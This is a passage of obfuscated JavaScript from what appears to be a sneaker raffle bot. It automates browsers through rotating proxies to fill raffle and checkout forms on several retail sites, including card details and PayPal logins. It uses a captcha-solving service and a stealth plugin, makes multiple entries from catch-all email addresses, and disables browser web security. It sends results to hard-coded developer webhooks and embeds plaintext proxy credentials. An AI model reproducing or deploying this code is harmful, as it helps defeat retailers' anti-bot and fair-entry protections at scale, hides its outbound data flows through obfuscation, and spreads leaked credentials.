    if (_0xff80bf['captchaKey'] == '' || _0xff80bf['captchaKey'] == undefined)
        return console['log'](_0x3b3689['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
    _0x479f93['use'](_0x16b6ec()), _0x479f93['use'](_0x50d2df({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xff80bf['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x56377a = 0x0; _0x56377a < _0xf6f2a['length']; _0x56377a++) {
        var _0x4c0d4d, _0x2d20d6 = [{
            'type': 'rich',
            'title': 'Succesful\x20JD\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'Product',
                    'value': '' + _0xf6f2a[_0x56377a]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0xf6f2a[_0x56377a]['Size']
                },
                {
                    'name': 'User',
                    'value': '' + _0x446b97
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xff80bf['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x49c529
                }
            ]
        }];
        const _0x40e098 = { 'embeds': _0x2d20d6 };
        _0x1dc4b6(_0x11fbff['name'] + '\x20Task\x20' + (_0x56377a + 0x1) + '\x20/\x20' + _0xf6f2a['length'] + '\x20||\x20File:\x20' + _0x1198e4 + '\x20Proxies:\x20' + _0x4ec7b9), await _0x58b1b9(_0xf6f2a, _0x56377a);
        var _0x22bd16 = await _0x2df3ee(_0xf6f2a[_0x56377a], _0x11fbff, 'dev', ![]), _0x22a9d5 = await _0x2df3ee(_0xf6f2a[_0x56377a], _0x11fbff, 'pub', ![]);
        const _0x5e8f5f = {
            'succesDEVMSG': { 'embeds': [_0x22bd16] },
            'succesPUBMSG': { 'embeds': [_0x22a9d5] }
        };
        if (_0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '')
            try {
                await _0x2110d2(_0xff80bf['webhook'], _0x5e8f5f['succesDEVMSG']);
            } catch {
            }
        await _0x4a79d2(0xc8), await _0x2110d2(_0x478ec4, _0x5e8f5f['succesDEVMSG']), await _0x4a79d2(0xc8);
        try {
            await _0x2110d2(_0x19d1c2, _0x5e8f5f['succesPUBMSG']);
        } catch {
        }
        if (_0xf6f2a[_0x56377a]['Email'] == '' || _0xf6f2a[_0x56377a]['Url'] == '' || _0xf6f2a[_0x56377a]['FirstName'] == '' || _0xf6f2a[_0x56377a]['LastName'] == '') {
            console['log'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x56377a + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xff80bf['useRandomProxy'] = ![])
            var _0x58c99e = _0x4833fe[_0x56377a]['split'](':');
        else
            var _0x5f50c8 = Math['round'](Math['random']() * (_0x4833fe['length'] - 0x1)), _0x58c99e = _0x4833fe[_0x5f50c8]['split'](':');
        const _0x5e1961 = await _0x479f93['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x58c99e[0x0] + ':' + _0x58c99e[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1e2f2c = await _0x5e1961['newPage']();
            await _0x1e2f2c['authenticate']({
                'username': '' + _0x58c99e[0x2],
                'password': '' + _0x58c99e[0x3]
            }), console['log'](_0x49028e() + '\x20[' + _0x11fbff['name'] + ']\x20Task\x20' + (_0x56377a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1e2f2c['setRequestInterception'](!![]), _0x1e2f2c['on']('request', _0x42c95f => {
                _0x42c95f['resourceType']() === 'image' || _0x42c95f['resourceType']() === 'font' || _0x42c95f['resourceType']() === 'media' ? _0x42c95f['abort']() : _0x42c95f['continue']();
            }), await _0x1e2f2c['goto']('' + _0xf6f2a[_0x56377a]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            });
            try {
                await _0x1e2f2c['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
            } catch {
                throw new Error('Not\x20an\x20Active\x20Raffle');
            }
            console['log'](_0x49028e() + '\x20[' + _0x11fbff['name'] + ']\x20Task\x20' + (_0x56377a + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1e2f2c['type']('#comp_firstname', '' + _0xf6f2a[_0x56377a]['FirstName']), await _0x1e2f2c['waitForSelector']('#comp_lastname'), await _0x1e2f2c['type']('#comp_lastname', '' + _0xf6f2a[_0x56377a]['LastName']), await _0x1e2f2c['waitForSelector']('#comp_email'), await _0x1e2f2c['type']('#comp_email', '' + _0xf6f2a[_0x56377a]['Email']), await _0x1e2f2c['waitForSelector']('#comp_paypalemail'), await _0x1e2f2c['type']('#comp_paypalemail', '' + _0xf6f2a[_0x56377a]['Email']), await _0x1e2f2c['waitForSelector']('#comp_mobile_end'), await _0x1e2f2c['type']('#comp_mobile_end', '' + _0xf6f2a[_0x56377a]['Phone']), await _0x1e2f2c['waitForSelector']('#comp_dob'), await _0x1e2f2c['type']('#comp_dob', '08/09/1992'), console['log'](_0x49028e() + '\x20[' + _0x11fbff['name'] + ']\x20Task\x20' + (_0x56377a + 0x1) + '\x20:\x20Choosing\x20Size');
            if (_0xf6f2a[_0x56377a]['Size'] == 'RANDOM') {
                const _0x5ef2cb = await _0x1e2f2c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x206e48 => {
                    return _0x206e48['map'](_0x16615a => _0x16615a['value']);
                });
                var _0x2a9f8e = Math['round'](Math['random']() * (_0x5ef2cb['length'] - 0x2));
                await _0x1e2f2c['select']('#shoesize', _0x5ef2cb[_0x2a9f8e + 0x1]), await _0x4a79d2(0x3e8);
            } else {
                const _0x130503 = await _0x1e2f2c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x440c7d => {
                    return _0x440c7d['map'](_0x1dbbea => _0x1dbbea['innerText']);
                }), _0x52cf04 = await _0x1e2f2c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3388cf => {
                    return _0x3388cf['map'](_0x3611e6 => _0x3611e6['value']);
                });
                var _0x14b006 = _0xf6f2a[_0x56377a]['Size'];
                for (var _0xa51c0a = 0x1; _0xa51c0a < _0x52cf04['length']; _0xa51c0a++) {
                    var _0x317fcc = _0x130503[_0xa51c0a]['split']('\x20')[0x0];
                    if (_0x317fcc == _0x14b006) {
                        await _0x1e2f2c['select']('#shoesize', _0x52cf04[_0xa51c0a]);
                        break;
                    } else {
                        if (_0xa51c0a + 0x1 == _0x52cf04['length'])
                            throw new Error('Size\x20Not\x20Found..');
                    }
                }
            }
            await _0x1e2f2c['waitForSelector']('#comp_address1'), await _0x1e2f2c['type']('#comp_address1', _0xf6f2a[_0x56377a]['Address1'] + '\x20' + _0xf6f2a[_0x56377a]['HouseNumber']), await _0x1e2f2c['waitForSelector']('#comp_address2'), await _0x1e2f2c['type']('#comp_address2', '' + _0xf6f2a[_0x56377a]['Address2']), await _0x1e2f2c['waitForSelector']('#comp_address2'), await _0x1e2f2c['type']('#comp_address3', '' + _0xf6f2a[_0x56377a]['City']), await _0x1e2f2c['waitForSelector']('#comp_postcode'), await _0x1e2f2c['type']('#comp_postcode', '' + _0xf6f2a[_0x56377a]['Zip']), console['log'](_0x49028e() + '\x20[' + _0x11fbff['name'] + ']\x20Task\x20' + (_0x56377a + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x4a79d2(0x4b0), await _0x1e2f2c['click']('label#emailhold'), await _0x4a79d2(0x5dc), await _0x1e2f2c['click']('#preauth_tandc_email\x20>\x20label'), await _0x4a79d2(0x5dc), await _0x1e2f2c['click']('#submit'), await _0x1e2f2c['waitForSelector']('#paymentWrap'), console['log'](_0x49028e() + '\x20[' + _0x11fbff['name'] + ']\x20Task\x20' + (_0x56377a + 0x1) + '\x20:\x20' + _0x3b3689['blue']('Awaiting\x20Paypal\x20Payment')), _0x5e1961['on']('targetcreated', async _0x3d413d => {
                if (_0x3d413d['type']() === 'page') {
                    const _0x570bff = await _0x3d413d['page']();
                    async function _0xf9d4ca() {
                        try {
                            await _0x1e2f2c['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x272a94 = !![];
                            return;
                        } catch {
                        }
                    }
                    async function _0x5b2183() {
                        try {
                            await _0x1e2f2c['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x381e46 = !![];
                            return;
                        } catch {
                        }
                    }
                    _0x5b2183(), _0xf9d4ca(), await _0x4a79d2(0x493e0);
                }
            });
            async function _0x3b2ff0() {
                for (let _0x5ceab6 = 0x0; _0x5ceab6 < 0x12c; _0x5ceab6++) {
                    if (_0x381e46 == !![]) {
                        console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x11fbff['name'] + ']\x20Task\x20' + (_0x56377a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '')
                            try {
                                await _0x2110d2(_0xff80bf['webhook'], _0x5e8f5f['succesDEVMSG']);
                            } catch {
                            }
                        await _0x4a79d2(0xc8), await _0x2110d2(_0x478ec4, _0x5e8f5f['succesDEVMSG']), await _0x4a79d2(0xc8);
                        try {
                            await _0x2110d2(_0x19d1c2, _0x5e8f5f['succesPUBMSG']);
                        } catch {
                        }
                        return;
                    } else {
                        if (_0x272a94)
                            throw new Error('Paypal\x20Error:\x20Target\x20closed');
                        else
                            await _0x4a79d2(0x3e8);
                    }
                }
                throw new Error('Paypal\x20Error');
            }
            await _0x4a79d2(0xbb8), await _0x1e2f2c['click']('.zoid-outlet'), await _0x4a79d2(0x7d0), await _0x3b2ff0();
        } catch (_0x15e0ec) {
            console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x11fbff['name'] + ']\x20Task\x20' + (_0x56377a + 0x1) + '\x20:\x20' + _0x15e0ec)), _0x4c0d4d = '' + _0x15e0ec;
            var _0x352e9f = await _0x2df3ee(_0xf6f2a[_0x56377a], _0x11fbff, 'dev', !![], _0x4c0d4d);
            _0x5e8f5f['errorDEV'] = { 'embeds': [_0x352e9f] }, _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x5e8f5f['errorDEV']), await _0x2110d2(_0x132dc8, _0x5e8f5f['errorDEV']);
        } finally {
            _0x5e1961 && _0x5e1961['close'](), console['log']('Waiting\x20for\x20' + _0xff80bf['delay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['delay']);
        }
    }
}
async function _0xb81644(_0x28bcb0, _0x554eb3, _0x455594) {
    _0x479f93['use'](_0x16b6ec()), _0x479f93['use'](_0x50d2df({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xff80bf['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4c8659 = 0x0; _0x4c8659 < _0x554eb3['length']; _0x4c8659++) {
        _0x1dc4b6(_0x28bcb0['name'] + '\x20Task\x20' + (_0x4c8659 + 0x1) + '\x20/\x20' + _0x554eb3['length'] + '\x20||\x20File:\x20' + _0x1198e4 + '\x20Proxies:\x20' + _0x4ec7b9);
        var _0x1b03a2 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x446b97
                },
                {
                    'name': 'Product',
                    'value': '' + _0x554eb3[_0x4c8659]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x554eb3[_0x4c8659]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xff80bf['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0xff80bf['version']
                }
            ]
        }];
        const _0x9ec80 = { 'embeds': _0x1b03a2 };
        await _0x58b1b9(_0x554eb3, _0x4c8659);
        if (_0x554eb3[_0x4c8659]['Email'] == '' || _0x554eb3[_0x4c8659]['Password'] == '' || _0x554eb3[_0x4c8659]['FirstName'] == '' || _0x554eb3[_0x4c8659]['LastName'] == '') {
            console['log'](_0x49028e() + '\x20[' + _0x28bcb0['name'] + ']\x20Task\x20' + (_0x4c8659 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x554eb3[_0x4c8659]['Password'] == '' || _0x554eb3[_0x4c8659]['Password'] == undefined) && (_0x554eb3[_0x4c8659]['Password'] = 'ErehsaWonRaj1!');
        if (_0xff80bf['useRandomProxy'] = ![])
            var _0x2a90d1 = _0x455594[_0x4c8659]['split'](':');
        else
            var _0x28eaa4 = Math['round'](Math['random']() * (_0x455594['length'] - 0x1)), _0x2a90d1 = _0x455594[_0x28eaa4]['split'](':');
        const _0x1854a7 = await _0x479f93['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2a90d1[0x0] + ':' + _0x2a90d1[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x50b658 = await _0x1854a7['newPage']();
            await _0x50b658['authenticate']({
                'username': '' + _0x2a90d1[0x2],
                'password': '' + _0x2a90d1[0x3]
            }), console['log'](_0x49028e() + '\x20[' + _0x28bcb0['name'] + ']\x20Task\x20' + (_0x4c8659 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x50b658['setRequestInterception'](!![]), _0x50b658['on']('request', _0x11ca64 => {
                _0x11ca64['resourceType']() === 'image' || _0x11ca64['resourceType']() === 'font' || _0x11ca64['resourceType']() === 'media' ? _0x11ca64['abort']() : _0x11ca64['continue']();
            }), await _0x50b658['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x50b658['goto']('' + _0x554eb3[_0x4c8659]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x50b658['waitForSelector']('#btnPdpAtb'), console['log'](_0x49028e() + '\x20[' + _0x28bcb0['name'] + ']\x20Task\x20' + (_0x4c8659 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x554eb3[_0x4c8659]['Size']);
            const _0x3a6221 = await _0x50b658['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x31f7f7 => {
                return _0x31f7f7['map'](_0x47fb1e => _0x47fb1e['innerText']);
            }), _0xe2fa8e = await _0x50b658['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x1bc2b3 = ![];
            if (_0x554eb3[_0x4c8659]['Size'] == 'RANDOM') {
                var _0x107060 = Math['round'](Math['random']() * (_0xe2fa8e['length'] - 0x1));
                await _0xe2fa8e[_0x107060]['click']();
            } else
                for (var _0x417431 = 0x0; _0x417431 < _0x3a6221['length']; _0x417431++) {
                    if (_0x3a6221[_0x417431] != _0x554eb3[_0x4c8659]['Size'])
                        continue;
                    try {
                        await _0xe2fa8e[_0x417431]['click']();
                    } catch {
                        console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x28bcb0['name'] + ']\x20Task\x20' + (_0x4c8659 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x1bc2b3 = !![];
                    }
                }
            if (_0x1bc2b3)
                continue;
            await _0x4a79d2(0x578), await _0x50b658['click']('#btnPdpAtb'), await _0x50b658['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x4a79d2(0x3e8), console['log'](_0x49028e() + '\x20[' + _0x28bcb0['name'] + ']\x20Task\x20' + (_0x4c8659 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x50b658['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x50b658['waitForSelector']('#email'), await _0x50b658['type']('#email', _0x554eb3[_0x4c8659]['Email']), await _0x4a79d2(0x226), await _0x50b658['click']('#guest-submit'), await _0x4a79d2(0x1b58), console['log'](_0x49028e() + '\x20[' + _0x28bcb0['name'] + ']\x20Task\x20' + (_0x4c8659 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x50b658['waitForSelector']('#firstname'), await _0x50b658['type']('#firstname', _0x554eb3[_0x4c8659]['FirstName'], 0x1f4), await _0x4a79d2(0x190), await _0x50b658['waitForSelector']('#surname'), await _0x50b658['type']('#surname', _0x554eb3[_0x4c8659]['LastName'], 0x1f4), await _0x4a79d2(0x190), await _0x50b658['waitForSelector']('#mobile'), await _0x50b658['type']('#mobile', _0x554eb3[_0x4c8659]['Phone'], 0x1f4), await _0x4a79d2(0x190), await _0x50b658['click']('#enterManualDiv'), await _0x4a79d2(0x5dc), await _0x50b658['waitForSelector']('#address1'), await _0x50b658['type']('#address1', _0x554eb3[_0x4c8659]['Address1'] + '\x20' + _0x554eb3[_0x4c8659]['HouseNumber'], 0x226), await _0x4a79d2(0x384), await _0x50b658['waitForSelector']('#address2'), await _0x50b658['type']('#address2', '' + _0x554eb3[_0x4c8659]['Address2'], 0x226), await _0x4a79d2(0x320);
            const _0x334cc9 = await _0x50b658['$$eval']('#countryselect_view3\x20>\x20option', _0x341cfb => {
                return _0x341cfb['map'](_0x1afe95 => _0x1afe95['value']);
            });
            var _0x4a1e4d;
            for (var _0x5466e1 = 0x0; _0x5466e1 < _0x334cc9['length']; _0x5466e1++) {
                if (_0x334cc9[_0x5466e1]['startsWith']('' + _0x554eb3[_0x4c8659]['Country'])) {
                    _0x4a1e4d = _0x334cc9[_0x5466e1];
                    break;
                }
                continue;
            }
            await _0x50b658['select']('#countryselect_view3', '' + _0x4a1e4d), await _0x50b658['waitForSelector']('#address4'), await _0x50b658['type']('#address4', '' + _0x554eb3[_0x4c8659]['City'], 0x1f4), await _0x4a79d2(0x384), await _0x50b658['waitForSelector']('#postcode'), await _0x50b658['type']('#postcode', '' + _0x554eb3[_0x4c8659]['Zip'], 0x1f4), await _0x4a79d2(0x4b0);
            const _0x215d34 = await _0x50b658['url']();
            console['log'](_0x49028e() + '\x20[' + _0x28bcb0['name'] + ']\x20Task\x20' + (_0x4c8659 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x51eb1a = _0x215d34['split']('?')[0x1], _0x39f766 = await _0x50b658['$']('#co_address_submit');
            await _0x39f766['evaluate'](_0x35dea3 => _0x35dea3['click']()), await _0x4a79d2(0x1388), await _0x50b658['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x51eb1a), console['log'](_0x49028e() + '\x20[' + _0x28bcb0['name'] + ']\x20Task\x20' + (_0x4c8659 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x50b658['waitForSelector']('#paymentbuttons'), await _0x4a79d2(0x1388), await _0x50b658['click']('#paymentbuttons\x20>\x20div'), await _0x4a79d2(0x1c2), await _0x50b658['waitForSelector']('#card-number'), await _0x50b658['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x207ccb = await _0x50b658['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x4c87b8 = await _0x207ccb['contentFrame']();
            await _0x4c87b8['waitForSelector']('.InputContainer'), await _0x4c87b8['click']('.InputContainer\x20>\x20input'), await _0x4a79d2(0x578), await _0x50b658['type']('#card-number', '' + _0x554eb3[_0x4c8659]['CreditNumber']), await _0x4a79d2(0xfa), await _0x50b658['type']('#card-expiry', '' + _0x554eb3[_0x4c8659]['ExpiryDate']), await _0x4a79d2(0xfa), await _0x50b658['type']('#card-cvc', '' + _0x554eb3[_0x4c8659]['CVV']), await _0x4a79d2(0x7d0), await _0x50b658['click']('#card-button'), console['log'](_0x49028e() + '\x20[' + _0x28bcb0['name'] + ']\x20Task\x20' + (_0x4c8659 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x50b658['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x28bcb0['name'] + ']\x20Task\x20' + (_0x4c8659 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x2110d2(_0x478ec4, _0x9ec80);
            } catch {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x28bcb0['name'] + ']\x20Task\x20' + (_0x4c8659 + 0x1) + '\x20:\x203DS\x20Failed')), _0x1b03a2[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x1b03a2[0x0]['description'] = '3DS\x20Failed', await _0x2110d2(_0x132dc8, _0x9ec80);
            }
        } catch (_0x3252be) {
            console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x28bcb0['name'] + ']\x20Task\x20' + (_0x4c8659 + 0x1) + '\x20:\x20' + _0x3252be)), _0x1b03a2[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x1b03a2[0x0]['description'] = '' + _0x3252be, await _0x2110d2(_0x132dc8, _0x9ec80);
        } finally {
            _0x1854a7 && _0x1854a7['close']();
            if (_0x4c8659 + 0x1 == _0x554eb3['length']) {
                console['log'](_0x3b3689['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x4a79d2(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0xff80bf['AfewDelay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['AfewDelay']);
        }
    }
}
async function _0x1392cd(_0x59a649, _0x4ce6dc, _0x57674c, _0x5a61a5, _0x3552a2) {
    var _0x174ea0, _0x37b8fc = {}, _0x391f7e = [], _0x16870d = {}, _0x3d3b54 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x5a61a5 && (_0x5a61a5 = {});
    if (_0x4ce6dc != 'ver') {
        _0x1dc4b6(_0x57674c['name'] + '\x20Task\x20' + (_0x59a649 + 0x1) + '\x20/\x20' + _0x5a61a5['length'] + '\x20||\x20File:\x20' + _0x1198e4 + '\x20Proxies:\x20' + _0x4ec7b9), await _0x58b1b9(_0x5a61a5, _0x59a649), _0x391f7e = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x446b97
                },
                {
                    'name': 'Size',
                    'value': '' + _0x5a61a5[_0x59a649]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xff80bf['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x49c529
                }
            ]
        }], _0x16870d = { 'embeds': _0x391f7e }, _0x37b8fc = _0x57674c['data'];
        _0x4ce6dc == 'exp' ? _0x37b8fc['data']['attributes']['email'] = '' + _0x5a61a5[_0x59a649]['FirstName'] + _0x5a61a5[_0x59a649]['LastName'] + _0xff80bf['catchall'] : _0x37b8fc['data']['attributes']['email'] = '' + _0x5a61a5[_0x59a649]['Email'];
        if (_0x5a61a5[_0x59a649]['Size'] == 'RANDOM') {
        }
        _0x37b8fc['data']['attributes']['properties']['$first_name'] = '' + _0x5a61a5[_0x59a649]['FirstName'], _0x37b8fc['data']['attributes']['properties']['$last_name'] = '' + _0x5a61a5[_0x59a649]['LastName'], _0x37b8fc['data']['attributes']['properties']['$address1'] = _0x5a61a5[_0x59a649]['Address1'] + '\x20' + _0x5a61a5[_0x59a649]['Address2'] + '\x20' + _0x5a61a5[_0x59a649]['HouseNumber'], _0x37b8fc['data']['attributes']['properties']['$zip'] = '' + _0x5a61a5[_0x59a649]['Zip'], _0x37b8fc['data']['attributes']['properties']['$city'] = '' + _0x5a61a5[_0x59a649]['City'], _0x37b8fc['data']['attributes']['properties']['$country'] = '' + _0x5a61a5[_0x59a649]['Country'], _0x37b8fc['data']['attributes']['properties']['Size'] = '' + _0x5a61a5[_0x59a649]['Size'], _0x37b8fc['data']['attributes']['properties']['$phone_number'] = '' + _0x5a61a5[_0x59a649]['Phone'], _0x37b8fc['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x5a61a5[_0x59a649]['Follower'];
    }
    if (_0xff80bf['useRandomProxy'] = ![])
        var _0x55c58b = _0x3552a2[_0x59a649]['split'](':');
    else
        var _0x3fdb28 = Math['round'](Math['random']() * (_0x3552a2['length'] - 0x1)), _0x55c58b = _0x3552a2[_0x3fdb28]['split'](':');
    var _0x32acab = {
        'jar': _0x7dd18d,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x57674c['url'],
        'headers': _0x57674c['headers'],
        'body': JSON['stringify'](_0x37b8fc),
        'proxy': 'http://' + _0x55c58b[0x2] + ':' + _0x55c58b[0x3] + '@' + _0x55c58b[0x0] + ':' + _0x55c58b[0x1]
    };
    return _0x4ce6dc != 'ver' && (_0x32acab['url'] = _0x57674c['url'], _0x32acab['headers'] = _0x57674c['headers']), _0x4ce6dc == 'ver' && (_0x32acab['method'] = 'GET'), new Promise(function (_0x46160a, _0x2f5f2a) {
        callback = async (_0x5ed373, _0xcfed4e, _0x5f1331) => {
            if (!_0x5ed373 && _0xcfed4e['statusCode'] == 0xca || !_0x5ed373 && _0xcfed4e['statusCode'] == 0xc8) {
                if (_0x4ce6dc != 'ver') {
                    var _0x3437b0 = await _0x2df3ee(_0x5a61a5[_0x59a649], _0x57674c, 'dev', ![]), _0x99310 = await _0x2df3ee(_0x5a61a5[_0x59a649], _0x57674c, 'pub', ![]);
                    const _0xbd704b = {
                        'succesDEVMSG': { 'embeds': [_0x3437b0] },
                        'succesPUBMSG': { 'embeds': [_0x99310] }
                    };
                    if (_0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '')
                        try {
                            await _0x2110d2(_0xff80bf['webhook'], _0xbd704b['succesDEVMSG']);
                        } catch {
                        }
                    await _0x4a79d2(0xc8), await _0x2110d2(_0x478ec4, _0xbd704b['succesDEVMSG']), await _0x4a79d2(0xc8);
                    try {
                        await _0x2110d2(_0x19d1c2, _0xbd704b['succesPUBMSG']);
                    } catch {
                    }
                }
                _0x46160a(console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x57674c['name'] + ']\x20Task\x20' + (_0x59a649 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x4ce6dc != 'ver') {
                    var _0x591f49 = '' + _0x5ed373, _0x21ea54 = await _0x2df3ee(_0x5a61a5[_0x59a649], _0x57674c, 'dev', !![], _0x591f49), _0x456c27 = {};
                    _0x456c27['errorDEV'] = { 'embeds': [_0x21ea54] }, _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x456c27['errorDEV']), await _0x2110d2(_0x132dc8, _0x456c27['errorDEV']);
                }
                _0x2f5f2a(console['log'](_0x49028e() + '\x20[' + _0x57674c['name'] + ']\x20Task\x20' + (_0x59a649 + 0x1) + ':\x20' + _0x5ed373));
            }
        };
        try {
            _0x4ce6dc != 'ver' && console['log'](_0x49028e() + '\x20[' + _0x57674c['name'] + ']\x20Task\x20' + (_0x59a649 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x37b8fc['data']['attributes']['email']), _0x11451f(_0x32acab, callback);
        } catch (_0x4677ee) {
            console['log'](_0x49028e() + '\x20Task\x20' + (_0x59a649 + 0x1) + ':\x20' + _0x4677ee);
        }
    });
}
;
async function _0x478a2d(_0x29f060, _0x15f243, _0x55bbf9) {
    var _0x2d40d2;
    _0x1dc4b6('' + _0x15f243);
    var _0x4a2934 = '194.135.23.69:50320:jarno3001:aeyfv0dg'['split'](':');
    const _0xe0113 = await _0x479f93['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x4a2934[0x0] + ':' + _0x4a2934[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x49028e() + '\x20[' + _0x15f243 + ']\x20Getting\x20Session');
        const _0x3325f3 = JSON['parse'](_0x7af797['readFileSync']('sessions/log.json')), _0x51e311 = await _0xe0113['newPage']();
        await _0x51e311['authenticate']({
            'username': '' + _0x4a2934[0x2],
            'password': '' + _0x4a2934[0x3]
        }), await _0x51e311['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x51e311, await _0x51e311['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x49028e() + '\x20[' + _0x15f243 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x51e311['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x49028e() + '\x20[' + _0x15f243 + ']\x20Successfully\x20logged\x20in'), await _0x4a79d2(0x2710), _0x2d40d2 = await _0x51e311['cookies'](), _0x7af797['writeFileSync']('sessions/log.json', '' + JSON['stringify'](_0x2d40d2));
        } catch (_0x306a7a) {
            throw new Error('Login\x20session\x20expired\x20' + _0x306a7a);
        }
        for (var _0x37eb5b = 0x0; _0x37eb5b < _0x29f060['length']; _0x37eb5b++) {
            console['log'](_0x49028e() + '\x20[' + _0x15f243 + ']\x20Task\x20' + (_0x37eb5b + 0x1) + '\x20:\x20Starting\x20Verification'), _0x1dc4b6(_0x15f243 + '\x20Task\x20' + (_0x37eb5b + 0x1) + '\x20/\x20' + _0x29f060['length']);
            const _0x2f5636 = await _0xe0113['newPage']();
            await _0x2f5636['goto']('' + _0x29f060[_0x37eb5b], { 'waitUntil': 'networkidle2' }), await _0x4a79d2(0xbb8);
            try {
                const _0x2b1251 = await _0x2f5636['$']('#challenge-heading');
                _0x2b1251 && (console['log'](_0x49028e() + '\x20[' + _0x15f243 + ']\x20Task\x20' + (_0x37eb5b + 0x1) + '\x20:\x20' + _0x3b3689['yellow']('2FA\x20Required')), await _0x2f5636['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x4a79d2(0x61a8), await _0x2f5636['waitForSelector']('#payment-submit-btn'), await _0x2f5636['$eval']('#payment-submit-btn', _0x3b6f6b => _0x3b6f6b['click']()), await _0x2f5636['click']('#payment-submit-btn');
                try {
